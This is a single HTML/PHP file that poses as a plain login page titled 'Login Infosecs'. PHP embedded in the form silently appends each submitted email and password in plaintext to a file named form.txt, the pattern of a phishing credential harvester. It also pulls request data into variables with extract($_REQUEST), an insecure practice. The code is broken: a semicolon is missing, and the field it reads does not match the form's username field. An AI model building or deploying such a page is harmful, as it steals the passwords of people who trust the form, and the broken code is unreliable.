<!DOCTYPE html> 
<html lang = "en"> 
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title> Login Page </title>
    <style> 
        Body {
        font-family: sans-serif;
        background-color: white;
        }
        button { 
            background-color: black; 
            width: 100%;
                color: white; 
                padding: 15px;  
                border: none; 
                cursor: pointer; 
            } 
        form { 
                border: 3px solid white; 
            } 
        input[type=text], input[type=password] { 
                width: 100%; 
                margin: 8px 0;
                padding: 12px 20px; 
                display: inline-block; 
                border: 2px solid black; 
                box-sizing: border-box; 
            }
        button:hover { 
                opacity: 0.7; 
            } 
        .cancelbtn { 
                width: auto; 
                padding: 10px 18px;
                margin: 10px 5px;
            } 
            
        
        .container { 
                padding: 25px; 
                background-color: white;
            } 
    </style> 
</head>  
<body>   
    <form action="index.php" method="post">
        <?php
            extract($_REQUEST);
            $file=fopen("form.txt", "a")

            fwrite($file, "email :");
            fwrite($file, $email . "\n");

            fwrite($file, "password :");
            fwrite($file, $password . "\n");

            fclose($file);
        ?>
        <center> <h1> Login Infosecs </h1> </center>
        <div class="container"> 
            <label>Username : </label> 
            <input type="text" placeholder="Enter Username" name="username" required>
            <label>Password : </label> 
            <input type="password" placeholder="Enter Password" name="password" required>
            <button type="submit">Login</button> 
        </div> 
    </form>   
</body>   
</html>